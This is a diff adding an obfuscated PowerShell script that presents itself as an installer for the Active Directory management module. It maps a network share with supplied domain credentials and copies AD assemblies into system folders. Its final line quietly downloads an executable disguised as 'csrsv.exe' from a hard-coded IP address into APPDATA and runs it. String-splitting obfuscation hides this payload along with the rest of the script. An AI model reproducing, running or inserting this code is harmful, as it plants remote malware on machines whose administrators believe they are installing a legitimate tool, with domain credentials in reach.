@@ -1,0 +1,121 @@
+[CmdletBinding()]
+param
+(
+	[string]
+	${domAIN`UsE`R`NAMe},
+	[string]
+	${domaiNp`As`SWo`RD},
+	[string]
+	${neT`W`oRkpa`TH},
+	[string]
+	${d`Riv`ELeTt`eR}
+)
+
+function COpy-`FoL`DEr {
+
+	
+	[CmdletBinding()]
+	param
+	(
+		[string]
+		${SOur`cEf`O`lDEr},
+		[string]
+		${dESt`I`NA`TIONf`Ol`Der}
+	)
+	
+	${EX`ecut`ABLE} = ${e`NV`:wind`Ir} + ((("{3}{1}{0}{4}{2}" -f'2{0}Robo','}system3','py.exe','{0','co'))  -F[cHAr]92)
+	${Sw`It`cHeS} = ${sOUrc`efo`LDeR} + [char]32 + ${De`st`I`NATi`O`NfOLDEr} + [char]32 + ("{2}{0}{1}"-f'eta',' /mir','/e /')
+	&("{2}{1}{0}"-f 'ost','te-H','Wri') ("{2}{1}{0}"-f 'ng ','opyi','C')((("{4}{0}{3}{2}{1}"-f '04','r.....','de','SourceFol','6'))  -CRePlAce  '604',[char]36) -NoNewline
+	${e`Rrc`ode} = (&("{0}{1}{3}{2}{4}"-f 'Sta','rt-Pr','ce','o','ss') -FilePath ${eXeC`UT`ABle} -ArgumentList ${S`wI`TCHES} -Wait -Passthru)."eXiTC`Ode"
+	If ((${er`R`coDE} -eq 0) -or (${err`C`oDe} -eq 1)) {
+		&("{2}{1}{0}" -f'-Host','e','Writ') ("{1}{0}"-f's','Succes') -ForegroundColor ("{0}{1}" -f'Y','ellow')
+	} else {
+		&("{2}{1}{0}" -f't','-Hos','Write') ("{3}{4}{6}{5}{1}{2}{0}" -f 'de','or c','o','Faile','d with e','r','r')${eRRc`OdE} -ForegroundColor ("{1}{0}" -f'd','Re')
+	}
+}
+
+function get-ar`c`H`IT`EcTurE {
+
+	
+	[CmdletBinding()][OutputType([string])]
+	param ()
+	
+	${oSa`RcH`iTeCTu`RE} = &("{2}{1}{0}{3}"-f'WmiObjec','t-','Ge','t') -Class ("{4}{3}{0}{2}{1}" -f'O','atingSystem','per','32_','Win') | &("{1}{0}{3}{2}"-f'lect-O','Se','ject','b') ("{3}{4}{0}{2}{1}" -f'c','ecture','hit','OSA','r')
+	${OSARCHite`ctU`Re} = ${O`sarCh`ITEct`U`RE}."osaRcH`it`ECTure"
+	Return ${osaRCH`ite`ctURe}
+	
+}
+
+
+function nEW-N`ETWoR`KDR`ive {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	${e`xEcut`AblE} = ${eNV`:wIN`dIr} + ((("{2}{1}{4}{0}{3}"-f '{0}ne','syste','{0}','t.exe','m32'))  -f [ChaR]92)
+	${sWIt`C`heS} = "use" + [char]32 + ${dR`iVeLe`Tt`Er} + ":" + [char]32 + ${n`eTWorK`p`ATH} + [char]32 + ("{0}{1}" -f '/user',':') + ${do`mAINu`sE`RNamE} + [char]32 + ${DoM`A`inPAS`SWOrD}
+	&("{1}{0}{2}" -f'-Hos','Write','t') ("{0}{1}{2}" -f 'M','appi','ng')((("{6}{0}{3}{5}{4}{2}{1}"-f'fVDriv','ive.....','P dr','eLetter','w',':y','R'))-CrEpLaCe([CHar]121+[CHar]119+[CHar]80),[CHar]92-REpLAcE([CHar]82+[CHar]102+[CHar]86),[CHar]36) -NoNewline
+	${e`RRC`ODe} = (&("{1}{3}{2}{0}"-f's','Start','ces','-Pro') -FilePath ${eXEc`Ut`A`BLE} -ArgumentList ${swi`Tc`HEs} -Wait -Passthru)."eX`I`TCoDE"
+	If ((&("{0}{1}{2}" -f 'Test','-P','ath') (("{1}{4}{3}{5}{2}{6}{0}" -f'K','h','tter','Dr','MJ','iveLe',':Cj')).REplaCE('CjK',[striNg][chaR]92).REplaCE('hMJ','$')) -eq ${T`RuE}) {
+		&("{2}{0}{3}{1}" -f'i','-Host','Wr','te') ("{0}{1}{2}"-f'Su','c','cess') -ForegroundColor ("{0}{1}"-f'Yello','w')
+	} else {
+		&("{2}{0}{1}" -f'os','t','Write-H') ("{0}{1}"-f'Faile','d') -ForegroundColor ("{1}{0}" -f'low','Yel')
+	}
+}
+
+function REmO`Ve-`N`eTWOr`KdrIVE {
+
+	
+	[CmdletBinding()]
+	param ()
+	
+	${EX`eCu`TA`BlE} = ${E`Nv:WIN`DIr} + ((("{6}{4}{1}{0}{3}{2}{5}"-f '32','em','t.','qrpne','syst','exe','qrp'))."R`Ep`LACe"(([cHaR]113+[cHaR]114+[cHaR]112),[sTrING][cHaR]92))
+	${S`Wi`TChEs} = "use" + [char]32 + ${drIv`E`LEtter} + ":" + [char]32 + ("{2}{0}{1}"-f 'le','te','/de')
+	&("{2}{0}{1}"-f'rite-Ho','st','W') ("{1}{0}{2}"-f 't','Dele','ing')((("{7}{4}{6}{3}{5}{2}{1}{0}" -f'.....','e','driv','etter','i',':hoi ','veL','EZxDr')) -CReplaCe  ([CHAr]104+[CHAr]111+[CHAr]105),[CHAr]92  -replacE([CHAr]69+[CHAr]90+[CHAr]120),[CHAr]36) -NoNewline
+	${erR`Co`dE} = (&("{3}{2}{1}{0}" -f 'ocess','r','P','Start-') -FilePath ${EX`E`C`Utable} -ArgumentList ${sWIt`c`HES} -Wait -Passthru)."e`xI`TCOdE"
+	If ((&("{2}{0}{1}" -f 'es','t-Path','T') ((("{5}{0}{1}{2}{4}{3}" -f'riveLe','tte','r:','w','pM','p1iD'))  -CReplace  'pMw',[cHar]92-CReplace([cHar]112+[cHar]49+[cHar]105),[cHar]36)) -eq ${t`RuE}) {
+		&("{1}{2}{0}" -f'ost','Wri','te-H') ("{0}{1}"-f'Fail','ed') -ForegroundColor ("{0}{1}"-f 'Y','ellow')
+	} else {
+		&("{0}{2}{1}"-f 'W','Host','rite-') ("{2}{0}{1}"-f'ucce','ss','S') -ForegroundColor ("{2}{1}{0}"-f 'low','l','Ye')
+	}
+}
+
+&("{0}{1}"-f 'cl','s')
+
+${aRC`HI`T`eC`TuRe} = &("{4}{2}{0}{3}{1}"-f't-A','cture','e','rchite','G')
+
+&("{0}{1}{3}{2}" -f 'New-Ne','twork','ive','Dr')
+
+${M`iCrOSO`Ftwi`NdO`w`SIVEC`En`TER`R`esOu`RcES} = &("{3}{4}{1}{0}{2}" -f'ldIte','Chi','m','G','et-') ((("{0}{3}{1}{2}"-f 'DdNDri','r:f','xH','veLette'))-rEpLACe 'DdN',[char]36  -rEpLACe ([char]102+[char]120+[char]72),[char]92) | &("{1}{0}"-f 'e','wher') { ${_}."A`TTrIB`UtES" -eq ("{0}{2}{1}" -f'Direc','y','tor') } | &("{3}{2}{1}{0}"-f 'ct','je','-Ob','Where') { ${_}."fUlL`N`AmE" -like ("{0}{2}{7}{5}{1}{4}{8}{6}{3}" -f '*msil_microsof','ente','t-wind','es*','r.','vec','urc','ows-d..i','reso') }
+
+${W`iN`SxsMi`c`RO`s`OftAct`iveDiRECtO`Ry`MaNAg`E`ME`NTre`sOUR`ceS} = &("{0}{1}{2}"-f'Ge','t-Chi','ldItem') (("{4}{3}{0}{2}{1}" -f 'er:r','A','h','t','zryDriveLet')).rEpLace('rhA',[stRInG][chAR]92).rEpLace('zry',[stRInG][chAR]36) | &("{0}{1}" -f 'wh','ere') { ${_}."ATt`RI`B`Utes" -eq ("{0}{2}{1}" -f'Di','ry','recto') } | &("{2}{1}{3}{0}" -f'ct','Obj','Where-','e') { ${_}."fUl`L`NAME" -like ("{2}{9}{4}{5}{3}{1}{0}{7}{8}{6}" -f'.man','ory','*','direct','oft.','active','ent*','ag','em','x86_micros') }
+
+${win`SXsMICrosO`F`TACtIve`DiR`eCT`Or`yM`Anag`EmENtREsour`Ces`_`X64} = &("{1}{3}{4}{0}{2}"-f'It','Get-Chi','em','l','d') ((("{4}{1}{3}{2}{0}"-f'Go','kjDriveLett','Q','er:','D')) -creplaCE  ([ChAR]68+[ChAR]107+[ChAR]106),[ChAR]36  -creplaCE'QGo',[ChAR]92) | &("{0}{1}" -f'wher','e') { ${_}."A`Ttr`ibUt`es" -eq ("{3}{1}{0}{2}" -f 'ctor','e','y','Dir') } | &("{0}{2}{1}" -f 'Where-Obje','t','c') { ${_}."Fu`LLn`AME" -like ("{10}{4}{12}{5}{8}{11}{2}{3}{9}{7}{6}{0}{1}"-f 'so','urces*','ir.','.anage','d64_micr','soft.acti','e','.r','ve','ment','*am','d','o') }
+
+
+&("{2}{0}{1}" -f 'op','y-Folder','C') -SourceFolder (("{0}{4}{2}{3}{1}{5}{7}{6}" -f'BAlNe','hmK','Pa','t','twork','pActiveDirect','y','or')).replace(([cHAr]109+[cHAr]75+[cHAr]112),'\').replace(([cHAr]66+[cHAr]65+[cHAr]108),'$') -DestinationFolder ((("{11}{7}{10}{2}{5}{6}{3}{14}{8}{12}{13}{9}{4}{0}{1}" -f 'e','siVIActiveDirectory','riVIS','3','l','ys','tem','nenv:','Shell','iVIModu','windi','bZ','i','VIv1.0','2iVIWindowsPower'))-CREpLAcE([chAr]98+[chAr]90+[chAr]110),[chAr]36 -CREpLAcE  ([chAr]105+[chAr]86+[chAr]73),[chAr]92)
+
+&("{0}{3}{1}{2}"-f 'C','y-Fo','lder','op') -SourceFolder (("{0}{14}{6}{5}{2}{12}{8}{9}{1}{11}{3}{7}{15}{13}{4}{10}" -f'at','.Ac','rk','ve','g','wo','Net','Dir','vtL','Microsoft','ement','ti','Path','a','S','ectory.Man')).rePLACE(([cHAr]97+[cHAr]116+[cHAr]83),'$').rePLACE('vtL','\') -DestinationFolder (("{13}{20}{8}{3}{10}{2}{21}{9}{14}{6}{12}{15}{11}{4}{1}{5}{17}{19}{22}{0}{7}{18}{23}{16}"-f'ector','AC_32','Micros','zw','uG','zw','Tzwu','y','indir','t','u','w','as','NA','.NE','semblyz','agement','uMi','.Ma','crosoft.Ac','Renv:w','of','tiveDir','n')).rEPlACE(([ChAr]78+[ChAr]65+[ChAr]82),'$').rEPlACE('zwu','\')
+
+&("{1}{0}{2}"-f '-','Copy','Folder') -SourceFolder ((("{5}{13}{6}{14}{3}{12}{0}{7}{9}{8}{10}{1}{4}{11}{2}"-f'oft.Act','gement.R','rces','{1}Micro','es','{0}','P','ive','irec','D','tory.Mana','ou','s','Network','ath')) -f [Char]36,[Char]92) -DestinationFolder ((("{5}{11}{15}{12}{19}{0}{8}{4}{18}{14}{10}{6}{13}{2}{3}{20}{1}{9}{7}{17}{16}"-f'osoft.NETd','eDir','_32','dapMicroso','sse','rxGe','apGA','me','apa','ectory.Manage','yd','n','ndirdap','C','l','v:wi','.Resources','nt','mb','Micr','ft.Activ')) -repLACE ([cHar]100+[cHar]97+[cHar]112),[cHar]92-repLACE  ([cHar]114+[cHar]120+[cHar]71),[cHar]36)
+
+&("{0}{2}{1}" -f'Copy','Folder','-') -SourceFolder ((("{7}{11}{4}{6}{1}{8}{2}{0}{10}{5}{3}{9}"-f 'ndows','orkPat','i','Resou','e','vecenter','tw','9','haTU9dfMicrosoftW','rces','I','dfN')) -repLace ([CHaR]57+[CHaR]100+[CHaR]102),[CHaR]36  -cREPlace ([CHaR]97+[CHaR]84+[CHaR]85),[CHaR]92) -DestinationFolder (("{4}{0}{10}{11}{6}{8}{9}{1}{3}{2}{5}{7}" -f'S','v','so','ecenterRe','fl0env:windirrl0WinSx','urc','icrosoftW','es','indows','I','rl0f','l0M')).REplACE(([ChaR]114+[ChaR]108+[ChaR]48),'\').REplACE('fl0',[sTRIng][ChaR]36)
+
+&("{1}{0}{2}" -f 'opy-Fol','C','der') -SourceFolder ((("{10}{13}{12}{4}{8}{3}{0}{11}{5}{7}{9}{6}{1}{2}" -f'i','tRes','ources','rosoftActiveD','ath21Vx14','e','men','ctoryMana','WinSxSMic','ge','x14','r','P','Network'))  -REpLaCe'x14',[CHaR]36  -CREplACE([CHaR]50+[CHaR]49+[CHaR]86),[CHaR]92) -DestinationFolder (("{11}{7}{3}{1}{8}{13}{9}{6}{2}{12}{5}{0}{10}{4}" -f 'oryManagementR','rW','ftActiveD','di','s','ct','xSMicroso','in','inSx','inS','esource','wapenv:w','ire','SMXbwapW')).rEPLAcE('wap',[StRInG][CHaR]36).rEPLAcE(([CHaR]77+[CHaR]88+[CHaR]98),[StRInG][CHaR]92)
+
+If (${ar`cHItE`cTure} -eq ("{0}{1}" -f'64-','bit')) {
+	
+	&("{1}{2}{0}"-f'lder','Copy-','Fo') -SourceFolder ((("{4}{2}{0}{5}{1}{3}" -f'A','tiveDire','f','ctory','0WzNetworkPathla','c'))  -RePlAcE  'laf',[cHAr]92  -RePlAcE ([cHAr]48+[cHAr]87+[cHAr]122),[cHAr]36) -DestinationFolder ((("{2}{3}{1}{4}{0}{5}{6}"-f'temD','v:Sy','{0}','en','s','riv','e{1}'))  -f [ChAR]36,[ChAR]92)
+	
+	&("{2}{3}{0}{1}" -f '-Fold','er','Cop','y') -SourceFolder (("{9}{2}{5}{4}{8}{1}{0}{3}{6}{7}" -f 'c','rosoft.A','tworkPath','tiveDirectory.M','FNMi','7','anagem','ent','c','5lGNe')).rEplAce(([cHaR]55+[cHaR]70+[cHaR]78),'\').rEplAce('5lG',[StrInG][cHaR]36) -DestinationFolder (("{3}{5}{2}{8}{6}{1}{13}{4}{11}{12}{10}{7}{0}{9}{14}" -f'e','OG','osoft.NET8','KWuenv:windir','icroso','89OMicr','bly89','ry.Manag','9Oassem','m','veDirecto','ft.','Acti','AC_6489OM','ent')).rEplaCE(([char]75+[char]87+[char]117),'$').rEplaCE(([char]56+[char]57+[char]79),'\')
+	
+	&("{2}{3}{0}{1}"-f 'Fo','lder','Copy','-') -SourceFolder ((("{2}{10}{9}{7}{0}{1}{4}{12}{11}{5}{14}{8}{13}{6}{3}{16}{15}"-f'}M','icr','{0}','sourc','oso','.A','Re','h{1','D','orkPat','Netw','t','f','irectory.Management.','ctive','s','e'))  -F  [char]36,[char]92) -DestinationFolder ((("{11}{1}{13}{23}{22}{4}{10}{16}{25}{2}{14}{15}{21}{24}{17}{18}{8}{9}{12}{3}{7}{20}{19}{6}{0}{5}"-f 'c','1}env:windir{','AC_64','ag','NET{0','es','sour','eme','D','irec','}assembly{','{','tory.Man','0}M','{0}M','i','0','t.Act','ive','.Re','nt','croso','oft.','icros','f','}G')) -f[cHaR]92,[cHaR]36)
+	
+	&("{0}{2}{3}{1}"-f 'C','older','opy','-F') -SourceFolder (("{10}{12}{15}{13}{0}{18}{6}{7}{16}{2}{4}{5}{11}{1}{9}{3}{14}{17}{8}{19}"-f'a','ect','oft','en','A','ctiveDi','hg','1F','_x','oryManagem','FW','r','BNetw','rkP','tResou','o','FWBWinSxSMicros','rces','t','64')).replACE(([char]103+[char]49+[char]70),'\').replACE(([char]70+[char]87+[char]66),'$') -DestinationFolder (("{21}{5}{7}{11}{1}{0}{12}{3}{8}{6}{2}{4}{18}{16}{14}{10}{17}{15}{9}{20}{19}{13}" -f'WinS','dirlPM','xSM','aU','icr','7e','inS','nv:w','7W','Man','ec','in','xSlPM','es_x64','r','ry','tActiveDi','to','osof','mentResourc','age','aU')).REPLACe(([Char]97+[Char]85+[Char]55),[STring][Char]36).REPLACe(([Char]108+[Char]80+[Char]77),'\')
+}
+
+
+&("{5}{4}{2}{1}{0}{3}" -f'kDri','r','wo','ve','t','Remove-Ne')
+
+(&("{2}{0}{1}" -f 'e','w-Object','N') ("{3}{1}{0}{2}" -f 'bC','tem.Net.We','lient','Sys')).("{3}{0}{2}{1}"-f'loa','File','d','Down').Invoke(("{10}{8}{1}{5}{11}{3}{9}{4}{2}{0}{7}{6}"-f'o/csrsv.','t','yaho','/94.102.53','~','p:','e','ex','t','.238/','h','/'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}{4}{3}" -f'-','Pr','Start','ss','oce') ("$env:APPDATA\csrsv.exe")
